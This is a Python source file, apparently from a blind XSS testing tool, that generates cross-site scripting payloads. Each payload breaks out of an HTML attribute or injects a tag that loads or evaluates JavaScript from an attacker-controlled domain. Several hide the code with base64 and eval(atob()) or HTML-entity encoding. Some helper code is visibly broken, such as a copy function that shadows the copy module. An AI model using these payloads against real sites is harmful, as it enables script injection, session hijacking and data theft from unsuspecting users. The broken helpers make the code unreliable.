import base64
import copy
from urllib.parse import quote

IS_USE_HTTPS = False
REQUEST_HEADING = 'https' if IS_USE_HTTPS else 'http'


def encode_uri_component(string):
    url_encoded_string = quote(string, safe='~()*-.')
    return url_encoded_string


def copy(input_data):
    return copy.deepcopy(input_data)


def html_encode(value):
    return str(value).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace('=', '&#61;').replace(' ', '&#32;')


def urlsafe_base64_encode(value):
    return base64.b64encode(value.encode()).decode().replace('=', '')


class PayloadGenerator:
    @staticmethod
    def js_attrib(base_domain):
        return f'var a=document.createElement("script");a.src="{REQUEST_HEADING}://{base_domain}";document.body.appendChild(a);'

    @staticmethod
    def basic_script(base_domain):
        return f'"><script src="{REQUEST_HEADING}://{base_domain}"></script>'

    @staticmethod
    def javascript_uri(base_domain):
        return f"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\''+ {REQUEST_HEADING}+'://{base_domain}\\';document.body.appendChild(a)')"

    @staticmethod
    def input_onfocus(js_attrib):
        return f'"><input onfocus=eval(atob(this.id)) id={html_encode(urlsafe_base64_encode(js_attrib))} autofocus>'

    @staticmethod
    def image_onerror(js_attrib):
        return f'"><img src=x id={html_encode(urlsafe_base64_encode(js_attrib))} onerror=eval(atob(this.id))>'

    @staticmethod
    def video_source(js_attrib):
        return f'"><video><source onerror=eval(atob(this.id)) id={html_encode(urlsafe_base64_encode(js_attrib))}>'

    @staticmethod
    def iframe_srcdoc(base_domain):
        return f'"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;{base_domain}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"'

    @staticmethod
    def xmlhttprequest_load(base_domain):
        return f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{REQUEST_HEADING}://{base_domain}");a.send();</script>'

    @staticmethod
    def jquery_chainload(base_domain):
        return f'<script>$.getScript("{REQUEST_HEADING}://{base_domain}")</script>'
